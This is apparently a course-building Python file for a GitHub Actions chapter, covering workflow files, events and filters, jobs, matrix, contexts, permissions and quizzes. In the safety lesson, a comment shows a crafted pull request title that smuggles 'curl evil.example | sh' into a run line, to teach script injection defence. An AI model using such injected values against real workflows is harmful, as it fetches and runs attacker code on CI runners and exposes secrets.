# Chapter 7.1: GitHub Actions concepts. Workflow files, events and filters (push, pull_request, workflow_dispatch,
# schedule, branches, tags, paths), jobs, steps, uses and run, runners, needs, if, matrix strategy, contexts and
# expressions, GITHUB_OUTPUT and GITHUB_ENV, permissions and GITHUB_TOKEN, concurrency, timeouts, environments,
# forks and script injection. Sources: GitHub docs: workflow syntax, events that trigger workflows, contexts,
# variables, secure use reference, limits. Facts checked on 2026-11-02 against github/docs main.
from cvkit import Kit, fx, fxs, ladder, scene, note, deep, table, steps, viz, eq
from gitkit import sh, flow, file, devqa

K = Kit()

K.lesson('anatomy', 'A workflow file, line by line', f'''
<p>A <b>workflow</b> is a YAML file in <code>.github/workflows/</code>. It says <b>when</b> to run (on), <b>where</b> (runs-on) and <b>what</b> (steps). This is the smallest useful one.</p>
{file('.github/workflows/hello.yml', """name: Hello CI
on:
  push:
    branches: [main]
  pull_request:
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v7
      - uses: actions/setup-python@v7
        with:
          python-version: '3.13'
      - name: Say hello
        run: |
          python --version
          echo "Commit ${{ github.sha }} on ${{ github.ref_name }}"
""", {1: 'The name shown in the Actions tab.', 2: 'The events that start this workflow.', 4: 'Only pushes to main. Pushes to other branches are ignored.', 5: 'Every pull request, from any branch, to any base branch.', 7: 'A job id. Use letters, digits, - and _.', 8: 'The runner image. ubuntu-latest, windows-latest and macos-latest are GitHub hosted.', 10: 'uses runs a ready made action. checkout clones your repository into the runner. Without it the runner has no files.', 12: 'with passes inputs to the action.', 13: 'Quoted, or YAML reads 3.10 as 3.1.', 15: 'run executes shell commands. The | keeps several lines.', 17: '${{ }} is an expression. github is a context with facts about the run.'})}
{table(['Key', 'Level', 'Meaning'], [
    ['<code>on</code>', 'workflow', 'events and filters'],
    ['<code>permissions</code>', 'workflow or job', 'what the automatic GITHUB_TOKEN may do'],
    ['<code>env</code>', 'workflow, job or step', 'environment variables'],
    ['<code>concurrency</code>', 'workflow or job', 'at most one run per group, optionally cancel the older one'],
    ['<code>runs-on</code>', 'job', 'which runner'],
    ['<code>needs</code>, <code>if</code>', 'job', 'order and conditions'],
    ['<code>strategy.matrix</code>', 'job', 'many jobs from one definition'],
    ['<code>timeout-minutes</code>', 'job or step', 'cancel after this many minutes. The job default is 360'],
    ['<code>uses</code> or <code>run</code>, <code>with</code>, <code>id</code>', 'step', 'an action or shell commands, inputs, a name to read outputs']])}
''', kw=['workflow file', '.github/workflows', 'on', 'jobs', 'runs-on', 'steps', 'uses', 'run', 'with', 'actions/checkout', 'setup-python', 'timeout-minutes'])

K.lesson('events', 'Events and filters: when does it run', f'''
<p>The <code>on</code> section decides which events start a run. Filters narrow it down by branch, tag or changed path. Type an event, a branch and the changed files, and the animation tells you whether the workflow runs and which rule decided.</p>
{viz('trigger')}
{table(['Event', 'Starts when', 'Good for'], [
    ['<code>push</code>', 'commits or tags are pushed', 'CI on main, release on tags'],
    ['<code>pull_request</code>', 'a PR is opened, gets new commits (synchronize) or is reopened, by default', 'checking a change before merge. The run tests the merge result of the PR with its base'],
    ['<code>workflow_dispatch</code>', 'someone presses Run workflow, or calls the API or gh workflow run', 'manual QA runs with inputs'],
    ['<code>schedule</code>', 'a cron time in UTC, on the default branch only', 'nightly regression'],
    ['<code>workflow_run</code>', 'another workflow finished', 'chaining a QA workflow after CI']])}
{fxs(
    fx('Branch and tag filters', '<code>branches: [main, \'release/**\']</code>, <code>tags: [\'v*\']</code>', '* matches any characters except /, ** also matches /.', key=True),
    fx('Path filters', '<code>paths: [\'app/**\']</code>, <code>paths-ignore: [\'docs/**\', \'**.md\']</code>', 'Skip the run when only docs changed. Use paths or paths-ignore for one event, not both.'),
    fx('Cron', '<code>- cron: \'30 2 * * 1-5\'</code>', 'Minute, hour, day of month, month, day of week. This is 02:30 UTC Monday to Friday.', key=True))}
{note('A workflow added on a feature branch with on: push: branches: [main] does not run for pushes to that feature branch. Beginners often think CI is broken. Add pull_request, open a PR, or push to main.', 'warn')}
{note('Scheduled runs can start late when GitHub is busy, especially at the top of the hour. Pick an odd minute such as 2:30 rather than 0:00.', 'tip')}
''', kw=['push', 'pull_request', 'workflow_dispatch', 'schedule', 'cron', 'UTC', 'workflow_run', 'branches filter', 'tags filter', 'paths', 'paths-ignore', 'glob'])

K.lesson('jobs', 'Jobs, needs, if, matrix and outputs', f'''
<p>Jobs run in parallel unless one <b>needs</b> another. A <b>matrix</b> runs the same job for every combination of values, for example every operating system with every Python version.</p>
{viz('matrix')}
{file('jobs-example.yml', """jobs:
  test:
    strategy:
      fail-fast: false
      matrix:
        os: [ubuntu-latest, windows-latest]
        python: ['3.12', '3.13']
    runs-on: ${{ matrix.os }}
    steps:
      - uses: actions/checkout@v7
      - uses: actions/setup-python@v7
        with:
          python-version: ${{ matrix.python }}
      - id: ver
        run: echo "tag=v$(date +%Y%m%d)" >> "$GITHUB_OUTPUT"
  release:
    needs: test
    if: github.ref == 'refs/heads/main' && github.event_name == 'push'
    runs-on: ubuntu-latest
    steps:
      - run: echo "Releasing"
""", {4: 'Default true: one failing combination cancels the others. false lets every combination finish, which QA usually wants for a full picture.', 8: 'The matrix value chooses the runner.', 15: 'A step writes name=value lines to the file in $GITHUB_OUTPUT. Later steps read steps.ver.outputs.tag.', 17: 'release waits for every matrix job of test.', 18: 'Run only for pushes to main, never for pull requests.'})}
{table(['Context', 'Example', 'Holds'], [
    ['<code>github</code>', '<code>github.sha</code>, <code>github.ref_name</code>, <code>github.event_name</code>', 'facts about the event and run'],
    ['<code>env</code>, <code>vars</code>, <code>secrets</code>', '<code>secrets.DEPLOY_KEY</code>', 'variables and encrypted secrets'],
    ['<code>matrix</code>, <code>strategy</code>', '<code>matrix.os</code>', 'the current combination'],
    ['<code>steps</code>, <code>needs</code>', '<code>needs.build.outputs.version</code>', 'outputs of earlier steps and jobs'],
    ['<code>inputs</code>', '<code>inputs.ci_run_id</code>', 'workflow_dispatch inputs'],
    ['<code>runner</code>', '<code>runner.os</code>', 'Linux, Windows or macOS']])}
{note('A matrix can produce at most 256 jobs per workflow run. Six operating systems times six Python versions times eight databases is already 288.', 'exam')}
''', kw=['needs', 'if', 'matrix', 'strategy', 'fail-fast', 'include', 'exclude', 'contexts', 'expressions', 'GITHUB_OUTPUT', 'outputs', 'github.ref', 'max-parallel'])

K.lesson('safety', 'Permissions, concurrency and safe workflows', f'''
{fxs(
    fx('Least privilege token', '<code>permissions:\n  contents: read</code>', 'Every run gets a GITHUB_TOKEN. Set only what the jobs need. Add actions: read to download artifacts from other runs, packages: write to publish packages.', key=True),
    fx('One run per branch', '<code>concurrency:\n  group: ci-${{ github.ref }}\n  cancel-in-progress: true</code>', 'A new push cancels the older run on the same branch, saving runner minutes.', key=True),
    fx('Environments', '<code>environment: qa</code> on a job', 'An environment can hold its own secrets and protection rules such as required reviewers before the job starts.'),
    fx('Debug logs', 'Re-run jobs with debug logging, or secret <code>ACTIONS_STEP_DEBUG</code> set to true', 'Shows extra output from actions.'))}
<p><b>Script injection.</b> Text from a pull request title, branch name or issue is controlled by whoever opened it. If you paste it into a run line with <code>${{{{ }}}}</code>, it becomes part of your shell script.</p>
{file('unsafe-and-safe.yml', """# Unsafe: a PR titled  x"; curl evil.example | sh; echo "  runs that command
- run: echo "Title: ${{ github.event.pull_request.title }}"
# Safe: pass it as an environment variable, the shell treats it as data
- env:
    TITLE: ${{ github.event.pull_request.title }}
  run: echo "Title: $TITLE\"""", {2: 'The expression is replaced before the shell runs, so quotes in the title end the string.', 5: 'An environment variable is never parsed as code.'})}
{note('Pull requests from forks get a read only GITHUB_TOKEN and no repository secrets. Do not switch to pull_request_target to work around this if the job runs code from the pull request, because that event runs with your secrets.', 'warn')}
{ladder(
    '<p>A workflow file says when to run, on which machine and which steps. Jobs run side by side unless one needs another.</p>',
    '<p>Events with branch, tag and path filters start runs. Jobs have runs-on, needs, if and strategy.matrix. Steps use actions or run commands and pass data with GITHUB_OUTPUT. Contexts such as github, secrets and matrix fill ${{ }} expressions.</p>',
    '<p>Security comes from least privilege permissions, SHA pinned actions, environment protection rules, never interpolating untrusted text into scripts and keeping fork PRs away from secrets.</p>',
    '<p>Reusable workflows (workflow_call), composite actions and OpenID Connect tokens let large organisations share pipelines and deploy to clouds without long lived secrets, a pattern also recommended by SLSA.</p>')}
''', kw=['permissions', 'GITHUB_TOKEN', 'concurrency', 'cancel-in-progress', 'environment', 'required reviewers', 'script injection', 'pull_request_target', 'forks', 'debug logging', 'OIDC', 'reusable workflow'])

K.quiz('e', 'In which folder must workflow files be?', ['.github/', '.github/workflows/', 'workflows/', '.ci/'], 1, 'Exact path.', 'Files elsewhere are ignored.')
K.quiz('e', 'Which step clones your repository into the runner?', ['actions/setup-python', 'actions/checkout', 'git init', 'actions/cache'], 1, 'Check out.', 'Without it the runner has no files.')
K.quiz('e', 'Which event adds a Run workflow button?', ['push', 'workflow_dispatch', 'schedule', 'pull_request'], 1, 'Dispatch.', 'It can take inputs too.')
K.quiz('m', 'on: push: branches: [main]. You push to feature/x. Does the workflow run?', ['Yes', 'No', 'Only with a tag', 'Only on Fridays'], 1, 'Filter.', 'Only pushes to main match.')
K.quiz('m', 'Which time zone does schedule cron use?', ['Your local time', 'UTC', 'The runner time zone', 'US Pacific'], 1, 'Universal.', 'Convert your local time to UTC.')
K.quiz('m', 'What does fail-fast: true do in a matrix?', ['Retries failures', 'Cancels the other combinations when one fails', 'Runs faster runners', 'Skips tests'], 1, 'Stop early.', 'It is the default.')
K.quiz('m', 'How does a step pass a value to later steps?', ['echo name=value >> "$GITHUB_OUTPUT"', 'export name=value', 'git config', 'a secret'], 0, 'A special file.', 'Read it with steps.<id>.outputs.name.')
K.quiz('h', 'Why put github.event.pull_request.title in env instead of directly in run?', ['It is shorter', 'Direct use lets a crafted title inject shell commands', 'env is faster', 'run cannot read contexts'], 1, 'Injection.', 'The expression is pasted into the script before the shell runs.')
K.quiz('h', 'Does a pull request from a fork receive your repository secrets in a pull_request workflow?', ['Yes', 'No, only a read only GITHUB_TOKEN', 'Only masked ones', 'Only on main'], 1, 'Untrusted code.', 'This protects secrets from outside contributors.')
K.quiz('x', 'What is the largest number of jobs a matrix may generate per workflow run?', ['64', '128', '256', '1000'], 2, 'A power of two.', 'GitHub documents a limit of 256.')

K.calc('e', 'Matrix: os has 3 values, python has 2. How many jobs?', '6', 'Multiply.',
       ['Every os with every python.', '3 × 2.', eq('6 jobs')], check=6)
K.calc('e', 'Same matrix with one exclude entry. How many jobs?', '5', 'Subtract.',
       ['6 combinations.', 'exclude removes 1.', eq('6 - 1 = 5 jobs')], check=5)
K.calc('m', 'Same matrix, one exclude and one include of a new combination. How many jobs?', '6', 'Add the new one.',
       ['After exclude: 5.', 'include adds a combination that did not exist.', eq('5 + 1 = 6 jobs')], check=6)
K.calc('m', 'Cron "30 2 * * 1-5". On how many days a week does it run?', '5', 'Day of week field.',
       ['The fifth field is 1-5.', '1 is Monday, 5 is Friday.', eq('5 days')], check=5)
K.calc('h', 'You want 08:00 IST (UTC+5:30) every day. What is the hour field in the cron line?', '2', 'Subtract 5:30.',
       ['08:00 minus 5 hours 30 minutes.', 'That is 02:30 UTC.', eq('cron "30 2 * * *", hour = 2')], check=2)
K.calc('h', 'A job has no timeout-minutes. After how many hours is it cancelled?', '6', 'Default 360 minutes.',
       ['The default timeout-minutes is 360.', '360 / 60.', eq('6 hours')], check=6)

K.must('Workflow file', '.github/workflows/*.yml with on, jobs, runs-on, steps (uses or run). checkout first. Quote versions.')
K.must('Events', 'push and pull_request with branches, tags, paths filters, workflow_dispatch with inputs, schedule cron in UTC on the default branch. * stops at /, ** does not.')
K.must('Jobs', 'Parallel by default, needs for order, if for conditions, matrix for combinations (max 256, fail-fast default true). Outputs through $GITHUB_OUTPUT.')
K.must('Contexts', 'github, env, vars, secrets, matrix, steps, needs, inputs, runner inside ${{ }}.')
K.must('Safety', 'permissions least privilege, concurrency with cancel-in-progress, environments with reviewers, untrusted text through env only, fork PRs get no secrets, job timeout default 360 minutes.')

T = K.topic(
    slug='gha-concepts', topic='gha-concepts', step=(7, 'GitHub Actions', 'gh-actions', 'Write GitHub Actions workflows from the first line: events, jobs, matrix and contexts, then a complete Dev and QA pipeline built from scratch, then artifacts and caches including how to pull a build from any run.', 'Intermediate'),
    title='GitHub Actions: events, jobs, matrix and contexts', short='Actions concepts', badge='7.1', minutes=55, added='2026-11-02',
    lead='Read and write any GitHub Actions workflow: which event starts it, how filters decide, how jobs depend on each other, how a matrix multiplies jobs, how data flows through contexts and outputs, and how to keep it secure.',
    desc='workflow files, on with push, pull_request, workflow_dispatch and schedule, branch, tag and path filters, cron in UTC, jobs, runs-on, steps, uses, run and with, needs and if, matrix with include, exclude and fail-fast, contexts and expressions, GITHUB_OUTPUT, permissions and GITHUB_TOKEN, concurrency, timeouts, environments, script injection and forks.',
    summary='Workflow anatomy, events and filters, jobs, needs, matrix, contexts, outputs, permissions and safety.',
    keywords=['github actions', 'workflow', 'on push', 'pull_request', 'workflow_dispatch', 'matrix', 'contexts', 'permissions'],
    recap='<p>on decides when, runs-on where, steps what. needs orders jobs, matrix multiplies them, contexts fill expressions, and permissions plus env variables keep the run safe.</p>')
